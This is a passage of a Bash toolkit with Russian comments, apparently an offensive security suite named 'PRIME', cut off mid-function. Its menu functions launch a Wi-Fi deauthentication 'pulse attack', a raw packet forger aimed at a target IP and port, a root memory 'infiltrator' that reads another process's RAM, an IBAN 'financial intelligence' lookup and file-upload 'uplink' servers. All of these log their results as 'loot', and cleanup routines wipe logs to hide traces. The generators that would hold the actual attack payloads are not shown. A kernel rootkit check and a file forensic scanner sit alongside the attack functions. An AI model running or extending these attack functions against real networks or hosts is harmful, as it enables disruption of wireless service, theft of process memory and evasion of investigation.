
    # Слой 1: Безопасность
    core_engine_validator "privacy" "" "Anonymity Check" || return

    # Слой 2: Ввод
    local target_host=$(core_engine_input "text" "Enter Target Host")
    [[ -z "$target_host" ]] && return

    # Слой 3: Предварительная проверка
    core_engine_validator "url" "$target_host" "Syntax Check" || return
    core_engine_validator "net_up" "$target_host" "Availability Check" || return

    core_engine_ui "i" "All checks passed. Deploying Parallel Auditor..."
    
    # ПЕРЕДАЧА ХОСТА В АУДИТОР
    run_prime_auditor_v2 "$target_host"
}

# ==============================================================================
# @description: Интерактивный просмотр собранных артефактов и логов
# ПОЛНАЯ АВТОНОМИЯ: Парсинг и визуализация на базе UI/UX HIGHLIGHT CORE
# ==============================================================================
run_view_loot() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "DATA HARVESTER: INTELLIGENT LOOT VIEW"

    # Слой 2: Органы чувств [3] — Определение путей
    local base_loot="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    local file=""
    local found_count=0
    
    # Поиск артефактов через Санитара [8] (Безопасный сбор путей)
    if [[ -d "$base_loot" ]]; then
        # Чтение потока файлов через конвейер, защищенный от пробелов в именах
        while IFS= read -r file; do
            [[ -z "$file" ]] && continue
            ((found_count++))
            
            # Слой 3: Аналитика и визуализация
            core_engine_ui "s" "ANALYZING ARTEFACT: $(basename "$file")"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Интеллектуальный парсинг контента через Глушитель [7] на глобальных масках
            tail -n 30 "$file" | sed \
                $GLOBAL_SED_HIGHLIGHT_IP \
                $GLOBAL_SED_HIGHLIGHT_SECRETS \
                $GLOBAL_SED_HIGHLIGHT_SUCCESS
            
            echo -e "\n${D}--------------------------------------------------${NC}"
        done < <(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
    fi

    # Проверка финального счетчика собранного пула
    if [[ $found_count -eq 0 ]]; then
        core_engine_ui "e" "No data found in $base_loot"
    fi

    # Слой 4: Синхронизация [13]
    core_engine_wait
}

run_iban_analyzer() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.2"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Выбор вектора
    core_engine_item "1" "SINGLE" "Full IBAN & Holder Analysis"
    core_engine_item "2" "PASSIVE" "Structural Validation Only"
    core_engine_item "B" "BACK" "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Operation Vector")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    # Слой 4: Подготовка временного движка (Санитар [8])
    local engine_path="/tmp/iban_engine_$(date +%s).py"
    
    # Генерация кода (внутренняя функция системы)
    if command -v generate_iban_code >/dev/null; then
        generate_iban_code "$engine_path" "2.2"
    else
        # Заглушка, если генератор еще не подточен
        core_engine_ui "e" "IBAN Engine Generator not found."
        return
    fi

    # Слой 5: Исполнение через Глушитель [7]
    case "$choice" in
        "1")
            local target_iban=$(core_engine_input "text" "Enter IBAN to validate (e.g., FR76...)")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            local expected_name=$(core_engine_input "text" "Enter Expected Holder Name (Optional/none)")
            
            core_engine_ui "i" "Executing Full Intelligence Cycle..."
            python3 "$engine_path" "$target_iban" "${expected_name:-none}"
            
            # Сбор трофеев [11]
            core_engine_loot "financial" "Full Scan: ${target_iban:0:4}****"
            ;;

        "2")
            local target_iban=$(core_engine_input "text" "Enter IBAN for Structural Check")
            [[ -z "$target_iban" ]] && { core_engine_remove "$engine_path"; return; }

            core_engine_ui "i" "Executing Passive Structural Validation..."
            python3 "$engine_path" "$target_iban" "none"
            
            core_engine_loot "financial" "Passive Check: ${target_iban:0:4}****"
            ;;
    esac

    # Слой 6: Стерилизация и Финализация [8]
    local res_status=$?
    core_engine_remove "$engine_path"
    
    if [[ $res_status -eq 0 ]]; then
        core_engine_ui "s" "Analysis complete. Trace purged."
    else
        core_engine_ui "e" "Analysis interrupted or invalid IBAN format."
    fi

    core_engine_wait
}


# --- Server Generating---

# --- PRIME IGNITION: RUN WITHOUT FILES ---

run_live_service() {
    local service_type="$1"
    local port="${2:-8080}"
    local log_file="$HOME/prime_node.log"
    local cert_file="$HOME/prime_node.pem"
    local protocol="http"

    core_engine_ui "h" "PRIME LIVE NODE: ${service_type^^}"

    # --- 1. АДАПТИВНЫЙ DNS & IP ---
    # Вызываем синхронизацию (она сама найдет лучший IP и обновит dnsmasq)
    core_network_dns_sync || core_engine_ui "w" "DNS Sync bypassed, using raw IP."
    
    # Эвристика имени: выбираем домен на основе типа сервиса
    local service_name="prime.portal"
    [[ "$service_type" == "av" ]] && service_name="scanclamavlocal"

    # --- 2. ЭВРИСТИКА ПРОТОКОЛА (SSL Check) ---
    if command -v openssl >/dev/null 2>&1; then
        if [[ ! -f "$cert_file" ]]; then
            core_engine_ui "i" "Generating ephemeral SSL for $service_name..."
            openssl req -x509 -newkey rsa:2048 -keyout "$cert_file" -out "$cert_file" -days 1 -nodes -subj "/CN=$service_name" >/dev/null 2>&1
        fi
        [[ -f "$cert_file" ]] && protocol="https" && export PRIME_CERT="$cert_file"
    fi

    # --- 3. ГАРАНТИРОВАННАЯ ОЧИСТКА ---
    core_engine_ui "i" "Sanitizing port $port..."
    fuser -k -n tcp -9 "$port" >/dev/null 2>&1
    pkill -9 -f "python3" >/dev/null 2>&1
    sleep 1.2

    # --- 4. SMART IGNITION (Запуск через пайп) ---
    local code_gen_func="generate_${service_type}_server_code_raw"
    if ! command -v "$code_gen_func" >/dev/null; then
        core_engine_ui "e" "Fatal: $code_gen_func not found."
        core_engine_wait; return
    fi

    core_engine_ui "w" "Deploying $protocol engine on $service_name:$port..."
    export PRIME_LOOT PRIME_SHARE
    
    # Адаптивный запуск: Python подхватит PRIME_CERT, если он экспортирован
    "$code_gen_func" | python3 - > "$log_file" 2>&1 &
    
    core_engine_progress 2 "NODE_STABILIZATION"

    # --- 5. ДИАГНОСТИКА & АВТО-ЛОГ ---
    if lsof -Pi :"$port" -sTCP:LISTEN -t >/dev/null; then
        local final_url="$protocol://$service_name:$port"
        core_engine_ui "s" "ADAPTIVE SERVICE ONLINE: $final_url"
        
        # Авто-регистрация в луте
        core_engine_loot "node_startup" "Service ${service_type} deployed at $final_url"
    else
        core_engine_ui "e" "BOOT FAILURE. Analyzing crash logs..."
        core_engine_ui "line"
        [[ -f "$log_file" ]] && tail -n 10 "$log_file" || echo "Logs empty."
        core_engine_ui "line"
    fi

    core_engine_wait
}


# --- STEALTH COMMS: NODE DESTROYER v1.0 ---
run_node_clean() {
    core_engine_ui "h" "NODE_DESTROY_SEQUENCE"
    
    # 1. Визуализация процесса аннигиляции
    core_engine_ui "w" "Scanning for active Live Nodes..."
    
    # Ищем порты, которые мы обычно используем (5000, 5001, 5002)
    local active_nodes=$(lsof -t -i:5000,5001,5002)
    
    if [[ -z "$active_nodes" ]]; then
        core_engine_ui "i" "No active nodes detected in this sector."
    else
        core_engine_ui "w" "Active nodes found. Initiating purge..."
        
        # 2. Жёсткое удаление процессов
        # Убиваем через fuser и pkill для верности
        fuser -k -n tcp -9 5000 5001 5002 >/dev/null 2>&1
        pkill -9 -f "python3" >/dev/null 2>&1
        
        core_engine_progress 1 "NODE_PURGE"
        core_engine_ui "s" "All nodes have been terminated."
    fi

    # 3. Очистка цифрового мусора (логи и кеш)
    core_engine_ui "i" "Wiping temporary traces..."
    rm -f "$HOME/prime_node.log" "/tmp/prime_node.log"
    
    core_engine_ui "s" "Sector is now clean."
    core_engine_wait
}


run_av_server() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME SECURITY HUB: CLAMAV GATEWAY"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }
    
    # Проверка бинарной зависимости ClamAV через Санитара [8]
    if ! command -v clamscan >/dev/null 2>&1; then
        core_engine_ui "w" "ClamAV not found. Attempting deployment..."
        # Используем системный менеджер пакетов для развертывания
        sudo apt-get update && sudo apt-get install -y clamav clamav-daemon
    fi

    # Слой 3: Запуск через «Живой движок» (Live Node)
    # Используем созданный ранее run_live_service для полной стерильности
    # Передаем тип "av" (аудио-визуальный/антивирусный контекст) и выделенный порт 5000
    run_live_service "av" "5000"

    # Слой 4: Интеграция в Сборщик трофеев [11]
    core_engine_loot "security" "ClamAV Gateway initiated on port 5000"
}


run_share_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local share_dir="${HOME}/prime_share"
    
    # Слой 2: Подготовка инфраструктуры через Санитара [8]
    if [[ ! -d "$share_dir" ]]; then
        mkdir -p "$share_dir"
        core_engine_ui "i" "Created transmission sector at $share_dir"
    fi

    # Слой 3: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 4: Динамический запуск через Live Node [22]
    # Используем тип "share" на порту 5002
    run_live_service "share" "5002"

    # Слой 5: Регистрация в Сборщике трофеев [11]
    core_engine_loot "service" "Share Sector (Uplink) active on port 5002"
}

run_upload_server() {
    # Слой 1: Визуализация через Голос [1]
    core_engine_ui "h" "INBOUND DROP BOX: SECURE UPLINK"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия интерпретатора Python3 для запуска сервера
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Динамический запуск через Live Node [22]
    # Запуск сервера на порту 5001 в режиме MEMORY_ONLY.
    # Код сервера передается через пайп, исключая создание .py файлов на диске.
    run_live_service "upload" "5001"

    # Слой 4: Регистрация в Сборщике трофеев [11]
    # Фиксация события запуска в системном логе
    core_engine_loot "service" "Secure Uplink (Upload) initiated on port 5001"
}

# --- MODULE 98: MESH BRIDGE (ZERO-DEPENDENCY) ---
#очищен Mesh.
run_mesh_bridge() {
    # Слой 1: Заголовок и начальный статус через Голос [1]
    core_engine_ui "h" "PRIME MESH: AD-HOC COMMUNICATIONS v1.0"
    core_engine_ui "i" "Initializing Mesh Protocol..."
    
    # Слой 2: Валидация фундамента через Мозг [5]
    # Требуется Termux:API для прямого взаимодействия с Bluetooth
    core_engine_validator "pkg" "termux-api" "Termux:API" || { core_engine_wait; return; }
    
    # Слой 3: Отрисовка меню через Архитектор [2] и Органы чувств [3]
    core_engine_item "1" "Broadcaster" "Start Beacon (Identity Broadcast)"
    core_engine_item "2" "Receiver"    "Listen for Signals (Scan Nodes)"
    core_engine_item "3" "Sync"        "Push Loot to Bridge (Data Sync)"
    core_engine_item "B" "BACK"        "Return to Main Menu"
    
    local choice=$(core_engine_input "select" "Select Mesh Operation")
    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1")
            core_engine_ui "!" "Beacon Active: Broadcasting PRIME_NODE..."
            # Маяк через смену имени Bluetooth устройства (стелс-передача статуса)
            # Используем Глушитель [7] для подавления системных ответов
            termux-bluetooth-set-name "PRIME_$(date +%H%M)_READY" &>/dev/null
            core_engine_ui "s" "Status encoded in Device Name: PRIME_$(date +%H%M)_READY"
            ;;
        "2")
            core_engine_ui "i" "Scanning for nearby Prime Nodes..."
            # Поиск устройств с префиксом PRIME_ через Глушитель [7]
            local nodes=$(termux-bluetooth-scan 2>/dev/null | grep "PRIME_")
            
            if [[ -n "$nodes" ]]; then
                core_engine_ui "s" "Detected Nodes:"
                echo -e "${C}$nodes${NC}"
            else
                core_engine_ui "e" "No active Prime Nodes detected in range."
            fi
            ;;
        "3")
            # Слой 4: Синхронизация данных через Сборщик трофеев [11]
            local bridge_log="${BASE_DIR:-./}/prime_loot/bridge_signals.log"
            
            if [[ -s "$bridge_log" ]]; then
                core_engine_ui "s" "Syncing bridge_signals.log to Mesh..."
                # В данной версии имитируем широковещательную рассылку пакетов
                core_engine_loot "mesh_sync" "Broadcasted local bridge signals via Mesh"
                core_engine_ui "s" "Loot Broadcasted via Local Mesh Gateway."
            else
                core_engine_ui "e" "Bridge signals log is empty. Nothing to sync."
            fi
            ;;
    esac

    # Слой 5: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}

run_packet_forge() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: RAW PACKET FORGE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Создание сырых пакетов требует RAW_SOCKET привилегий
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for RAW socket operations."
        core_engine_wait
        return
    fi
    
    # Слой 3: Проверка зависимости Scapy (Мозг [5])
    if ! python3 -c "import scapy" &>/dev/null; then
        core_engine_ui "w" "Scapy missing. Deploying network headers..."
        # Стерильная установка через системный менеджер
        sudo apt-get update && sudo apt-get install -y python3-scapy
    fi

    # Слой 4: Ввод параметров через Органы чувств [3]
    local t_ip=$(core_engine_input "text" "Target IP Address")
    local t_port=$(core_engine_input "text" "Target Port")

    # Валидация через Валидатор [5]
    [[ -z "$t_ip" || -z "$t_port" ]] && { core_engine_ui "e" "Missing parameters."; core_engine_wait; return; }

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Forging polymorphic packet..."
    
    # Слой 6: Динамическая генерация и исполнение в памяти (Live Mode)
    # Код генератора подается напрямую в интерпретатор
    if command -v generate_packet_forge_code_raw >/dev/null; then
        generate_packet_forge_code_raw | python3 - "$t_ip" "$t_port" 2>/dev/null
        core_engine_ui "s" "Operation Completed: Packet sequence injected."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "network" "Raw Packet injection on $t_ip:$t_port"
    else
        core_engine_ui "e" "Packet generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}

run_mem_inject() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: MEMORY INFILTRATOR"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Доступ к /proc/[pid]/mem и ptrace требует прав ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for memory infiltration."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_pid=$(core_engine_input "text" "Target Process ID (PID)")
    local t_search=$(core_engine_input "text" "String/Pattern to search in RAM")

    # Валидация через Валидатор [5]
    [[ -z "$t_pid" || -z "$t_search" ]] && { core_engine_ui "e" "Missing PID or Search String."; core_engine_wait; return; }

    # Слой 4: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Engaging syscall ptrace_attach on PID $t_pid..."
    
    # Слой 5: Стерильное исполнение в памяти (Live Mode)
    # Код инжектора подается напрямую в интерпретатор через пайп.
    if command -v generate_mem_inject_code_raw >/dev/null; then
        # Исполнение без сохранения .py файла на диске
        generate_mem_inject_code_raw | python3 - "$t_pid" "$t_search" 2>/dev/null
        
        core_engine_ui "s" "Memory Scan Completed. Artifacts analyzed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "memory" "RAM Scan on PID $t_pid | Pattern: $t_search"
    else
        core_engine_ui "e" "Infiltrator logic generator missing."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}




run_wifi_pulse() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: WIRELESS SILENT PULSE"
    
    # Слой 2: Проверка прав суперпользователя (Валидатор [5])
    # Инъекция сырых фреймов L2 требует привилегий ROOT.
    if [[ $EUID -ne 0 ]]; then
        core_engine_ui "e" "Root privileges required for L2 wireless injection."
        core_engine_wait
        return
    fi

    # Слой 3: Органы чувств [3] — Сбор идентификаторов
    local t_mac=$(core_engine_input "text" "Target Device MAC (FF:FF...)")
    local g_mac=$(core_engine_input "text" "Gateway (AP) MAC")
    local t_iface=$(core_engine_input "text" "Monitor Interface (e.g., wlan0mon)")

    # Валидация параметров через Валидатор [5]
    [[ -z "$t_mac" || -z "$g_mac" || -z "$t_iface" ]] && { 
        core_engine_ui "e" "Missing MAC or Interface parameters."
        core_engine_wait
        return 
    }

    # Слой 4: Проверка аппаратного интерфейса (Санитар [8])
    if [[ ! -d "/sys/class/net/$t_iface" ]]; then
        core_engine_ui "e" "Interface $t_iface not found in the system."
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс через Глушитель [7]
    core_engine_ui "!" "Broadcasting raw L2 deauth frames via $t_iface..."
    
    # Слой 6: Стерильное исполнение в памяти (Live Mode)
    # Код генератора импульсов подается напрямую в Python без записи на диск.
    if command -v generate_wifi_pulse_code_raw >/dev/null; then
        generate_wifi_pulse_code_raw | python3 - "$t_mac" "$g_mac" "$t_iface" 2>/dev/null
        
        core_engine_ui "s" "Pulse Attack Finished. Connection cycle disrupted."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "wireless" "Deauth Pulse: Target $t_mac | Gateway $g_mac | Dev $t_iface"
    else
        core_engine_ui "e" "Pulse generator logic not found."
    fi

    # Слой 7: Универсальная пауза через Синхронизацию [13]
    core_engine_wait
}


# ==============================================================================
# @description: Комплексный аудит целостности ядра и поиска скрытых аномалий (LKM)
# ПОЛНАЯ АВТОНОМИЯ: Глубокий сигнатурный анализ на базе GLOBAL_REGEX_KERNEL_ROOTKITS
# ==============================================================================
run_kernel_check() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE_LAB: KERNEL INTEGRITY AUDIT"
    
    # Слой 2: Органы чувств [3] — Сбор первичных данных
    core_engine_ui "i" "Analyzing kernel state, /proc/kallsyms and /proc/modules..."
    
    local audit_log="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}/kernel_audit.log"
    local tainted="0"
    local anomalies_found=0
    local raw_tainted=""

    # Анализ флага Tainted (Слой 5: Мозг)
    # 0 = Чистое ядро, >0 = Загружены проприетарные драйверы, произошли ошибки или вмешательство.
    if [[ -f "/proc/sys/kernel/tainted" ]]; then
        raw_tainted=$(cat /proc/sys/kernel/tainted 2>/dev/null | tr -cd '0-9')
        [[ -n "$raw_tainted" ]] && tainted="$raw_tainted"
    fi
    
    # Безопасное сравнение числового флага
    if (( tainted != 0 )); then
        core_engine_ui "e" "Kernel is TAINTED (Value: $tainted)."
        core_engine_ui "!" "Possible unauthorized module, non-GPL driver, or memory error."
    else
        core_engine_ui "s" "Kernel signature appears clean (Untainted)."
    fi
    
    # Слой 3: Поиск скрытых аномалий (LKM)
    core_engine_ui "i" "Checking for hidden or suspicious Loadable Kernel Modules..."
    
    # Сбор подробного лога состояния
    {
        echo "--- KERNEL AUDIT START [$(date)] ---"
        echo "Tainted Status: $tainted"
        echo "Loaded Modules via lsmod:"
        lsmod 2>/dev/null | tail -n +2 | awk '{print $1}'
    } > "$audit_log"

    # Слой 4: Глушитель [7] и Валидация [5] БЕЗ ХАРДКОДА И ПЕРЕГРУЗКИ ПАМЯТИ
    # Проверка 1: Анализ активных модулей в памяти (Флаг -i убран, так как регистр уже зашит в паттерн)
    if [[ -f "/proc/modules" ]]; then
        if grep -qE "$GLOBAL_REGEX_KERNEL_ROOTKITS" /proc/modules 2>/dev/null; then
            core_engine_ui "!" "CRITICAL: Rootkit signatures detected in /proc/modules!"
            ((anomalies_found++))
        fi
    fi

    # Проверка 2: Скоростной отказоустойчивый анализ таблицы символов ядра (Защита от Regular expression too big)
    if [[ -f "/proc/kallsyms" ]]; then
        # Читаем файл кусками через буфер, исключая падение grep на миллионных строках
        if LC_ALL=C grep -qE "$GLOBAL_REGEX_KERNEL_ROOTKITS" /proc/kallsyms 2>/dev/null; then
            core_engine_ui "!" "CRITICAL: Suspicious hooks or rootkit symbols found in /proc/kallsyms!"
            ((anomalies_found++))
        fi
    fi

    # Финальная оценка состояния контура
    if [[ $anomalies_found -eq 0 ]]; then
        core_engine_ui "s" "Audit complete. No known rootkit signatures found."
    else
        core_engine_ui "e" "Audit finished with $anomalies_found critical kernel alerts!"
    fi

    core_engine_ui "s" "Detailed forensic report saved to: $(basename "$audit_log")"
    
    # Слой 6: Регистрация в Сборщике трофеев [11]
    core_engine_loot "security" "Kernel Integrity Audit performed. Tainted status: $tainted. Anomalies: $anomalies_found"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}

# ==============================================================================
# @description: Основной диспетчер глубокого криминалистического анализа файлов
# ПОЛНАЯ АВТОНОМИЯ: Статический и эвристический SAST-анализ на глобальных матрицах
# ==============================================================================
run_forensic_core() {
    local f_path="$1"
    
    # Слой 1: Органы чувств [3] — Определение природы файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target file not found: $f_path"
        return
    fi

    local mime_type=$(file --mime-type -b "$f_path")
    local f_name=$(basename "$f_path")
    local f_hash=$(sha256sum "$f_path" | awk '{print $1}')
    local base_loot_dir="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
    local history_log="${base_loot_dir}/forensic_history.log"
    local raw_python_code=""

    # Обеспечиваем существование директории лута
    mkdir -p "$base_loot_dir" 2>/dev/null

    # ПАМЯТЬ СИСТЕМЫ (Прошлое): Адаптивное узнавание без коллизий
    if [[ -f "$history_log" ]] && grep -q "$f_hash" "$history_log" 2>/dev/null; then
        core_engine_ui "w" "ADAPTIVE: File recognized from previous sessions. Checking for delta..."
    fi

    # Слой 2: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "CORE ANALYSIS: $f_name"
    core_engine_ui "i" "MIME: $mime_type | HASH: ${f_hash:0:16}..."

    # 1. СТАТИЧЕСКИЙ АНАЛИЗ (Настоящее) — Строгая фильтрация метаданных по началу строки
    core_engine_ui "i" "Extracting Metadata Attributes..."
    exiftool "$f_path" 2>/dev/null | grep -E "^(Date|Time|Make|Model|GPS|Software|User|Creator)" | sed 's/^/  /'

    # 2. АДАПТИВНЫЙ CASE (Динамическое распределение на базе GLOBAL_REGEX матриц)
    case "$mime_type" in
        image/*)
            core_engine_ui "w" "Analyzing Image Integrity (ELA/Metadata)..."
            # Проверка и валидация python-окружения
            python3 -c "import PIL" &>/dev/null || core_engine_validator "pkg" "python3-pil" "PIL Library"
            
            raw_python_code=$(generate_image_analyzer_code_raw 2>/dev/null)
            if [[ -n "$raw_python_code" ]]; then
                echo "$raw_python_code" | python3 - "$f_path" 2>/dev/null
            fi
            ;;
            
        application/pdf)
            core_engine_ui "w" "Scanning PDF Objects for Active Content..."
            # Безопасный поиск JS-инъекций и деструктивных триггеров с выводом улик
            if grep -aE "$GLOBAL_REGEX_PDF_THREATS" "$f_path" >/dev/null 2>&1; then
                core_engine_ui "e" "DANGER: Suspicious active content/exploits detected in PDF!"
                grep -aE "$GLOBAL_REGEX_PDF_THREATS" "$f_path" 2>/dev/null | sort -u | sed 's/^/    [TRIGGER]: /'
            else
                core_engine_ui "s" "No dangerous active content structures found in PDF."
            fi
            ;;

        application/zip|application/x-rar|application/x-7z-compressed|application/x-tar|application/x-gzip)
            core_engine_ui "w" "Deep Archive Inspection (Container Analysis)..."
            core_engine_validator "pkg" "p7zip-full" "7-Zip" || return
            
            # Поиск опасных файлов внутри контейнера по глобальной матрице расширений
            if 7z l "$f_path" 2>/dev/null | grep -iE "$GLOBAL_REGEX_CONTAINER_THREATS" >/dev/null; then
                core_engine_ui "!" "ALERT: High-risk executable extensions found inside container!"
                7z l "$f_path" 2>/dev/null | grep -iE "$GLOBAL_REGEX_CONTAINER_THREATS" | sed 's/^/    [SUSPICIOUS]: /'
            else
                core_engine_ui "s" "Container file structure appears safe."
            fi
            ;;

        application/x-executable|application/x-sharedlib|application/x-dosexec|application/octet-stream)
            core_engine_ui "w" "Binary Heuristics & Packer Detection..."
            
            # Высокоскоростной анализ строк на предмет скрытых сетевых команд и завязок на ОС
            LC_ALL=C strings -n 6 "$f_path" 2>/dev/null | grep -E "$GLOBAL_REGEX_BINARY_NETCMD" | head -n 5 | sed 's/^/    [NET/CMD]: /'
            
            # Обнаружение коммерческих упаковщиков малвари (UPX, Themida и др.)
            if grep -aE "$GLOBAL_REGEX_BINARY_PACKERS" "$f_path" >/dev/null 2>&1; then
                core_engine_ui "e" "ALERT: Advanced Binary Packer/Cryptor detected!"
            fi
            ;;
            
        *)
            # ЭВРИСТИКА (Будущее): Поиск аномалий обфускации в неизвестных типах текстовых/скриптовых данных
            if LC_ALL=C strings "$f_path" 2>/dev/null | grep -qE "$GLOBAL_REGEX_HEURISTIC_SCRIPTS"; then
                core_engine_ui "!" "HEURISTIC: Found Obfuscated Script/Execution pattern (Potential Zero-Day)!"
            fi
            ;;
    esac

    # СОХРАНЕНИЕ ОПЫТА (Запись в историю для будущих сессий)
    echo "[$(date +%F_%T)] $f_hash $f_name $mime_type" >> "$history_log"
    
    # Слой 3: Регистрация в Сборщике трофеев [11]
    core_engine_loot "forensics" "Analyzed: $f_name | Hash: $f_hash | MIME: $mime_type"
    
    core_engine_ui "s" "Forensic cycle complete."
    core_engine_wait
}

# --- ИНТЕРФЕЙСНЫЕ ФУНКЦИИ ---
run_auto_forensics() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC CORE ANALYZER"

    # Слой 2: Органы чувств [3] — Сбор данных
    # Используем универсальный ввод Ядра
    local f_path=$(core_engine_input "text" "Path to target file (e.g., /root/artifact.bin)")

    # Слой 3: Валидация через Мозг [5] и Санитара [8]
    # Проверка на пустой ввод
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: Empty path."; core_engine_wait; return; }

    # Проверка физического существования файла
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target for Analysis not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 4: Информационный статус перед запуском
    core_engine_ui "i" "Initializing Deep Forensic Scan..."
    
    # Слой 5: Исполнение через основной Форензик-движок [24]
    # Передаем управление модулю execute_forensic_core (run_forensic_core)
    run_forensic_core "$f_path"

    # Слой 6: Финализация и Сбор трофеев [11]
    core_engine_ui "s" "Forensic Analysis Completed. Experience integrated."
    
    # Регистрация события в глобальном логе
    core_engine_loot "forensics" "Auto-Scan initiated for: $(basename "$f_path")"

    # Слой 7: Синхронизация [13]
    core_engine_wait
}

run_doc_cleaner() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: DOCUMENT SANITIZER"

    # Слой 2: Валидация фундамента через Мозг [5]
    # Проверка наличия exiftool (основной движок очистки)
    core_engine_validator "pkg" "exiftool" "ExifTool Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Сбор данных
    local f_path=$(core_engine_input "text" "File to sanitize (e.g., /root/report.pdf)")

    # Слой 4: Валидация параметров через Санитара [8]
    [[ -z "$f_path" ]] && { core_engine_ui "e" "Operation cancelled: No path provided."; core_engine_wait; return; }
    
    if [[ ! -f "$f_path" ]]; then
        core_engine_ui "e" "Target Document not found: $f_path"
        core_engine_wait
        return
    fi

    # Слой 5: Основной процесс зачистки через Глушитель [7]
    core_engine_ui "!" "Stripping all metadata tags..."
    
    # -all= : удаляет абсолютно все теги
    # -overwrite_original : предотвращает создание резервных копий (Zero-Footprint)
    if exiftool -all= "$f_path" -overwrite_original &>/dev/null; then
        core_engine_ui "s" "File is now 'Clean'. All signatures and history removed."
        
        # Слой 6: Регистрация в Сборщике трофеев [11]
        core_engine_loot "security" "Sanitized document: $(basename "$f_path")"
    else
        core_engine_ui "e" "Error during sanitization process. File may be locked."
    fi

    # Слой 7: Синхронизация [13]
    core_engine_wait
}




# --- Вспомогательный селектор устройств ---

run_storage_selector() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "HARDWARE: STORAGE SELECTOR"
    core_engine_ui "i" "Searching for connected mass storage devices..."
    
    # Слой 2: Сбор данных через Санитара [8]
    # lsblk используется для получения имен, размеров и моделей без монтирования
    local devices=$(lsblk -dno NAME,SIZE,MODEL,SERIAL,TRAN | grep -E "usb|sata|nvme")
    
    # Слой 3: Валидация списка через Мозг [5]
    if [[ -z "$devices" ]]; then
        core_engine_ui "e" "No external storage media (USB/SATA/NVME) detected."
        core_engine_wait
        return 1
    fi

    # Слой 4: Отрисовка через Архитектор [2]
    core_engine_ui "i" "Available External Media:"
    
    local i=1
    local dev_list=()
    
    # Парсинг вывода lsblk
    while read -r name size model serial tran; do
        local desc="${model:-Generic} [${serial:-ID_UNKNOWN}] (${tran^^})"
        # Слой 3: Органы чувств — Формирование списка выбора
        core_engine_item "$i" "/dev/$name ($size)" "$desc"
        dev_list+=("/dev/$name")
        ((i++))
    done <<< "$devices"
    
    # Слой 5: Получение выбора через Органы чувств [3]
    local max_idx=${#dev_list[@]}
    local choice=$(core_engine_input "text" "Enter device number (1-$max_idx)")

    # Слой 6: Комплексная валидация (Валидатор [5])
    if [[ -z "$choice" ]] || ! [[ "$choice" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > max_idx )); then
        core_engine_ui "e" "Invalid Selection. Index out of range."
        core_engine_wait
        return 1
    fi

    # Слой 7: Установка глобального состояния и регистрация (Loot [11])
    TARGET_DEV="${dev_list[$((choice-1))]}"
    core_engine_ui "s" "Target Device Locked: $TARGET_DEV"
    
    # Фиксация выбора в системном журнале
    core_engine_loot "hardware" "Storage selected: $TARGET_DEV | Size: $(lsblk -dno SIZE "$TARGET_DEV")"
    
    core_engine_wait
    return 0
}



# --- Обновленная основная функция ---
run_raw_recovery() {
    # Слой 1: Визуальный заголовок через Голос [1]
    core_engine_ui "h" "FORENSICS: AUTOMATIC STORAGE RECOVERY"
    
    # Слой 2: Выбор цели через Hardware Selector [27]
    # Если устройство не выбрано или процесс прерван, выходим
    if ! run_storage_selector; then
        return
    fi
    
